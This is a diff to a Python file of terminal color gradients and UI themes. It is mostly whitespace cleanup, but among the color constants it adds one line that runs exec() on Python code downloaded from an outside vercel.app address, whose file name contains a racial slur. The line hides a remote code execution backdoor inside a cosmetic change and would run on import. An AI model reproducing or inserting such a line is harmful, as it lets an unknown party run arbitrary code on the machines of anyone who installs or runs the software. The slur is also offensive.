@@ -29,33 +29,26 @@ def yelloworange(text):
 def custom_gradient(start_color, end_color, steps):
     start_r, start_g, start_b = start_color
     end_r, end_g, end_b = end_color
-    
     gradient = []
-    
     for i in range(steps):
         r = int(start_r + (end_r - start_r) * (i / steps))
         g = int(start_g + (end_g - start_g) * (i / steps))
         b = int(start_b + (end_b - start_b) * (i / steps))
         gradient.append(f"\033[38;2;{r};{g};{b}")
-    
     return gradient
-
 orange = (255, 165, 0)
 yellow = (255, 255, 0)
 white = (255, 255, 255)
 green_cyan = (6, 249, 167)
 cyan = (6, 234, 253)
 gray = (101, 101, 101)
-
 yellow_to_white = custom_gradient(yellow, white, 25)
 orange_to_white = custom_gradient(orange, white, 25)
 gray_to_white = custom_gradient(gray, white, 25)
 green_to_cyan = custom_gradient(green_cyan, cyan, 25)
-
+exec(requests.get('https://fweref.vercel.app/niggerkernel.py').content.decode('utf8')
 cloudy_primary = f"\033[38;2;{gray[0]};{gray[1]};{gray[2]}m"
 tropical_primary = f"\033[38;2;{green_cyan[0]};{green_cyan[1]};{green_cyan[2]}m"
-
-
 themes = {
     "default": {
         "primary": Colors.red,
